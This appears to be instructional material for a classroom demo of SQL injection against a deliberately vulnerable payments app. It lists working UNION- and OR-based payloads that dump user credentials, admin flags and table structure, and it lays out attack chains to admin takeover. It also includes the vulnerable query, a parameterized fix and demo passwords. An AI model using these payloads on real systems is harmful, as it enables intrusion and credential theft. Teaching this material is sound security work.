# SQL Injection Attack Payloads

This document provides SQL injection payloads specifically for the `/status` page vulnerability.

## 🎯 Target

**Vulnerable Endpoint**: `/status?id=<payload>`

**Vulnerability**: The payment ID parameter is directly concatenated into the SQL query without sanitization.

**Vulnerable Code**:
```python
query = f"SELECT * FROM payments WHERE user_id = {current_user.id} AND id = {payment_id}"
```

**Why it's vulnerable**: The `payment_id` is placed at the END of the WHERE clause, making it easy to use SQL comments (`--`) to ignore the rest of the query.

---

## 📊 Database Schema

### Tables
1. **users** - Contains user accounts and credentials
2. **payments** - Contains payment transactions
3. **feedback** - Contains user feedback/comments

### Users Table Structure
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT,
    email TEXT,
    password_hash TEXT,
    full_name TEXT,
    is_admin INTEGER,
    created_at TIMESTAMP
)
```

### Payments Table Structure
```sql
CREATE TABLE payments (
    id INTEGER PRIMARY KEY,
    user_id INTEGER,
    amount REAL,
    recipient TEXT,
    description TEXT,
    status TEXT,
    created_at TIMESTAMP
)
```

---

## � SQLite Comment Syntax

**Important**: In SQLite, SQL comments use `--` followed by a space or end of line.

**Query Structure**:
```sql
SELECT * FROM payments WHERE user_id = 3 AND id = [YOUR_PAYLOAD]
```

When you inject `1 OR 1=1--`, the query becomes:
```sql
SELECT * FROM payments WHERE user_id = 3 AND id = 1 OR 1=1--
```

The `--` comments out nothing in this case, but the `OR 1=1` makes the entire WHERE clause true!

---

## �🔓 Basic SQL Injection Payloads

### 1. Bypass User Restriction
View ALL payments regardless of user:

```
?id=1 OR 1=1
```

**Explanation**: The `OR 1=1` makes the WHERE clause always true, showing all payments.

**Alternative with comment**:
```
?id=1 OR 1=1-- 
```
(Note: Add a space after `--` or it may cause issues)

### 2. Enumerate Payment IDs
```
?id=1 OR 1=1 LIMIT 1 OFFSET 0
?id=1 OR 1=1 LIMIT 1 OFFSET 1
?id=1 OR 1=1 LIMIT 1 OFFSET 2
```

---

## 🔍 Information Extraction

### 3. Extract User Credentials
Retrieve ALL user information including password hashes:

```
?id=1 UNION SELECT id, username, email, password_hash, full_name, is_admin, created_at FROM users
```

**What you get**: Username, email, password hash, admin status for all users

### 4. Extract ONLY Admin Credentials
```
?id=1 UNION SELECT id, username, email, password_hash, full_name, is_admin, created_at FROM users WHERE is_admin=1
```

**What you get**: Admin account details only

### 5. Extract Specific User by Username
```
?id=1 UNION SELECT id, username, email, password_hash, full_name, is_admin, created_at FROM users WHERE username='admin'
```

### 6. List All Usernames
```
?id=1 UNION SELECT id, username, username, username, username, id, created_at FROM users
```

---

## 🗂️ Database Enumeration

### 7. List All Tables
```
?id=1 UNION SELECT 1, 2, 3, name, 5, 6, 7 FROM sqlite_master WHERE type='table'
```

**Result**: Shows all table names in the database

### 8. List Table Columns
```
?id=1 UNION SELECT 1, 2, 3, sql, 5, 6, 7 FROM sqlite_master WHERE type='table' AND name='users'
```

**Result**: Shows the CREATE TABLE statement with all column names

### 9. Count Users
```
?id=1 UNION SELECT 1, 2, 3, COUNT(*), 5, 6, 7 FROM users
```

### 10. Count Admin Users
```
?id=1 UNION SELECT 1, 2, 3, COUNT(*), 5, 6, 7 FROM users WHERE is_admin=1
```

---

## 💣 Advanced Attack Payloads

### 11. Extract All Feedback (Including XSS Payloads)
```
?id=1 UNION SELECT id, username, message, message, username, id, created_at FROM feedback
```

**Use Case**: Find stored XSS payloads left by other attackers

### 12. Extract Payment Summary by User
```
?id=1 UNION SELECT user_id, 'Total:', 'Amount:', SUM(amount), 'per user', user_id, created_at FROM payments GROUP BY user_id
```

### 13. Find Highest Value Payments
```
?id=1 UNION SELECT id, recipient, description, amount, status, user_id, created_at FROM payments ORDER BY amount DESC LIMIT 5
```

### 14. Identify Admin User IDs
```
?id=1 UNION SELECT id, username, email, 'ADMIN', full_name, 999, created_at FROM users WHERE is_admin=1
```

---

## 🎭 Attack Chain Examples

### Chain 1: Extract Admin Credentials → Login as Admin

**Step 1**: Extract admin password hash
```
?id=1 UNION SELECT id, username, email, password_hash, full_name, is_admin, created_at FROM users WHERE username='admin'
```

**Step 2**: The password hash is visible in the result (for demo: `admin123`)

**Step 3**: Login as admin at `/login`

**Step 4**: Access admin panel at `/admin`

**Step 5**: Create backdoor admin accounts or modify existing users

---

### Chain 2: SQLi → XSS → Session Hijacking

**Step 1**: Use SQLi to view feedback table
```
?id=1 UNION SELECT id, username, message, message, username, id, created_at FROM feedback
```

**Step 2**: Find XSS payloads in feedback

**Step 3**: Visit feedback page to trigger stored XSS

**Step 4**: XSS steals session cookie

**Step 5**: Use stolen cookie to impersonate user

---

### Chain 3: Complete Database Dump

**Step 1**: List all tables
```
?id=1 UNION SELECT 1,2,3,name,5,6,7 FROM sqlite_master WHERE type='table'
```

**Step 2**: Extract users table
```
?id=1 UNION SELECT id, username, email, password_hash, full_name, is_admin, created_at FROM users
```

**Step 3**: Extract all payments
```
?id=1 OR 1=1
```

**Step 4**: Extract all feedback
```
?id=1 UNION SELECT id, username, message, message, username, id, created_at FROM feedback
```

---

## 🛡️ Defense Techniques (To Demonstrate)

### ❌ VULNERABLE (Current Code)
```python
# The payload comes at the END of the WHERE clause, making exploitation easier
query = f"SELECT * FROM payments WHERE user_id = {current_user.id} AND id = {payment_id}"
payment = conn.execute(query).fetchone()
```

### ✅ SECURE (Parameterized Query)
```python
query = "SELECT * FROM payments WHERE user_id = ? AND id = ?"
payment = conn.execute(query, (current_user.id, payment_id)).fetchone()
```

### Additional Security Measures
1. **Input Validation**: Validate that `payment_id` is numeric
2. **Prepared Statements**: Use parameterized queries
3. **Least Privilege**: Database user should have minimal permissions
4. **Error Handling**: Don't expose SQL errors to users
5. **Logging**: Log suspicious queries
6. **WAF**: Web Application Firewall can detect SQLi patterns

---

## 📝 Demo Script

### For Instructors/Presenters

**Setup (1 min)**
1. Open application in browser
2. Login as Alice (`alice` / `password123`)
3. Navigate to Status page

**Demo 1: Basic SQLi (2 min)**
```
Show legitimate use:
?id=1

Show SQLi bypass:
?id=1 OR 1=1

Explain: This shows all payments, not just Alice's
```

**Demo 2: Extract Credentials (3 min)**
```
Show admin credential extraction:
?id=1 UNION SELECT id, username, email, password_hash, full_name, is_admin, created_at FROM users WHERE is_admin=1

Point out:
- Admin username visible
- Password hash visible (explain hashing)
- is_admin flag = 1
```

**Demo 3: Database Enumeration (2 min)**
```
Show table discovery:
?id=1 UNION SELECT 1,2,3,name,5,6,7 FROM sqlite_master WHERE type='table'

Explain: Attacker can map entire database structure
```

**Demo 4: Attack Chain (3 min)**
```
1. Use SQLi to get admin hash
2. Logout, login as admin
3. Create new admin user
4. Explain privilege escalation
```

**Key Talking Points**
- ✅ Always use parameterized queries
- ✅ Never trust user input
- ✅ Validate and sanitize all inputs
- ✅ Use ORM frameworks when possible
- ✅ Hide detailed error messages in production
- ✅ Principle of least privilege for DB users

---

## 🔥 Real-World Impact

### What Attackers Can Do
- ✅ Extract all user credentials
- ✅ Identify admin accounts
- ✅ Bypass authentication
- ✅ Access sensitive payment data
- ✅ Modify database records (with UNION INSERT)
- ✅ Create backdoor accounts
- ✅ Chain with XSS for complete compromise

### Business Impact
- 💰 Data breach (PCI DSS violation)
- 💰 Regulatory fines (GDPR, CCPA)
- 💰 Loss of customer trust
- 💰 Legal liability
- 💰 Reputational damage

---

## 🎓 Learning Objectives

After this demo, students should understand:
1. How SQL injection works
2. The difference between SQLi and XSS
3. How to chain multiple vulnerabilities
4. Impact of SQL injection on business
5. How to write secure SQL queries
6. Importance of defense in depth

---

## ⚠️ Disclaimer

These payloads are for **educational purposes only** in a controlled demonstration environment. 

**Never** use these techniques against:
- Production systems
- Systems you don't own
- Systems without explicit permission

Unauthorized access is **illegal** and can result in criminal prosecution.

---

## 📚 Additional Resources

- OWASP SQL Injection Guide
- SQLMap automated testing tool
- Burp Suite for manual testing
- DVWA (Damn Vulnerable Web App)
- PortSwigger SQL Injection Labs
